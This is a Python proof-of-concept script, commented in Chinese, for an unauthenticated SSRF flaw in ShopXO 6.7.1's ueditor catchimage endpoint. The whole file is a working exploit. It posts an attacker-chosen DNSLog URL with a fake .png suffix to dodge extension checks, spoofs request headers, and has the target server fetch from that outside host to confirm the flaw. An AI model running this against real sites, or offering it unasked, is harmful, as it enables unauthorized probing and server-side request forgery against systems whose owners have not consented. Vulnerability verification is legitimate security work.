#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ShopXO 6.7.1 Unauthenticated SSRF - DNSLog (OOB) 验证工具
=====================================================================
[+] 用于在无回显或无法读取内网的情况下，通过 DNS 解析记录盲测 SSRF 漏洞。
"""

import requests
import argparse
import urllib3
import json

# 禁用自签名证书告警
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def verify_dnslog(target_url, dnslog_domain):
    print("=" * 60)
    print(" ShopXO SSRF 盲测工具 (DNSLog OOB 模式)")
    print("=" * 60)

    target_url = target_url.rstrip('/')
    print(f"[*] 目标靶站: {target_url}")
    print(f"[*] 监听域名: {dnslog_domain}")

    endpoint = f"{target_url}/index.php"

    # 路由参数
    params = {
        "s": "ueditor/index",
        "action": "catchimage"
    }

    # 构造带有 DNSLog 地址的 URL
    # 后缀加上 /test.png 骗过前端的文件扩展名校验
    payload_url = f"http://{dnslog_domain}/test.png"

    # 核心 Payload 放入 POST
    post_data = {
        "source[]": payload_url
    }

    # 必要的请求头伪装
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SSRF-DNSLog-Tester",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json"
    }

    print(f"[*] 正在指令目标服务器抓取: {payload_url}")

    try:
        resp = requests.post(endpoint, params=params, data=post_data, headers=headers, verify=False, timeout=8)
        print(f"[+] 请求发送完成！HTTP 状态码: {resp.status_code}")

        try:
            json_data = resp.json()
            print(f"[*] 服务器业务响应: {json.dumps(json_data, ensure_ascii=False)}")
        except:
            print(f"[*] 服务器原生响应: {resp.text[:150]}")

        print("\n[!] 探测载荷已投递完毕！")
        print(f"[!] 请立即刷新您的 DNSLog 平台 [{dnslog_domain}]。")
        print("[!] 如果出现了 DNS 解析记录，则证明 SSRF (OOB) 漏洞绝对存在！")

    except Exception as e:
        print(f"[-] 网络请求发送失败: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShopXO SSRF DNSLog (OOB) 探测工具")
    parser.add_argument("-t", "--target", required=True, help="目标 URL, 例: http://127.0.0.1/shopxo")
    parser.add_argument("-d", "--dnslog", required=True, help="你的 DNSLog 域名, 例: xxx.dnslog.cn")

    args = parser.parse_args()

    verify_dnslog(args.target, args.dnslog)